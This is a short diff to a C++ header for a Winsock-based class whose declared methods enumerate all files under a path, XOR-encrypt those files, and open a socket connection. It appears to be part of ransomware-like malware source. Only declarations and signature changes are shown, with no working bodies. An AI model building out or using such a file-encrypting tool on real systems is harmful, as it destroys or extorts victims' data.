@@ -7,6 +7,7 @@
 
 #include <iostream>
 #include <string>
+#include <cstring>
 #include <WS2tcpip.h>
 #include <vector>
 #include <memory>
@@ -52,7 +53,7 @@ class Connection {
     vector<filesystem::path> &getAllFiles(string path, vector<filesystem::path> files);
 
     //Encrypt data with xor encryption with key
-    string encryptData(string &data, string key);
+    string encryptData(string data, string key);
 
     //Encrypt all the files in path with xor
     void encryptFiles(string path);
@@ -61,8 +62,7 @@ class Connection {
     string readFile(filesystem::path path);
 
     //Write data to a file in path
-    void writeToFile(string path, auto &data);
-
+    void writeToFile(filesystem::path path, auto data);
 
     //Creating the connection
     void connection(SOCKET socket);
